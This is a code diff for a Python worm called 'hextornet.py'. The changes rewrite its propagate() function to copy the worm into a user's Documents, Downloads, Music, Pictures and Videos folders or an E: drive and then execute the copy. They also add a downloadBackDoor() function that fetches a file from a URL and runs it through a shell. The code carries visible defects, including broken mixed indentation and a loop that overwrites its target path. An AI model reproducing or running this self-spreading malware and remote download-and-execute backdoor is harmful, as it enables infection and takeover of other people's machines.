@@ -19,32 +19,36 @@ import shutil
 [==========================]
 """
 
-def propagate():
-	#gets the current location of the worm
-	src = os.path.abspath("hextornet.py")
-	
-	usr = getpass.getuser()
-	
+"""
 	if(os.path.isdir("E:\\")):
-		dts = "E:" + "\\hextornet.py"
-		print(dts)
-
-	#checks for Documents folder in Linux
-	elif(os.path.isdir("/home/" + usr + "/Documents/")):
-		dst = "/home/" + usr + "/Documents/" + "hextornet.py"
-	
-	#checks for Documents folder in Windows
-	elif(os.path.isdir("C:\\Users\\" + usr + "\\Documents")):
-		dst = "C:\\Users\\" + usr + "\\Documents\\"+"hextornet.py"
+		dst = "E:" + "\\hextornet.py"
 
 	#checks for C:/ drive on windows
 	elif(os.path.isdir("C:\\")):
 		dst = "C:\\Users\\" + usr + "\\hextornet.py"
+"""
 
-	else:
-		dst = os.getcwd() + "hextornet.py"
+src = os.path.abspath("hextornet.py")
+usr = getpass.getuser()
 
-	copyfile(src, dst)
+def propagate():
+
+	directoriesLinux = ["Documents", "Downloads", "Music", "Pictures", "Videos"]
+
+	dst=""
+
+	if(os.path.isdir("E:\\")):
+		dst = "E:" + "\\hextornet.py"
+
+	#Propagate worn in all directories
+	for directory in directoriesLinux:
+		if(os.path.isdir("/" + usr + "/" + directory + "/")):
+			dst = "/" + usr + "/" + directory + "/" + "hextornet1.py"
+		else:
+			dst = os.getcwd() + "hextornet.py"
+	
+        copyfile(src, dst)
+	run(dst)
 	print("Worm location")
 	print("dst:", dst)
 	print("src:", src)
@@ -75,4 +79,23 @@ def hide():
 
 """
 
-propagate()
+def downloadBackDoor(url):
+	filename = url.split('/')[-1].split('#')[0].split('?')[0]
+	content = urlopen(url).read()
+        outfile = open(filename, "wb")
+        outfile.write(content)
+        outfile.close()
+        run(os.path.abspath(filename))
+
+def run(program):
+	process = sp.Popen(program, shell=True)
+	process.wait()
+
+def main():
+	#copy()
+	#hide()
+	propagate()
+	#downloadBackDoor("")
+
+if __name__ == "__main__":
+	main()
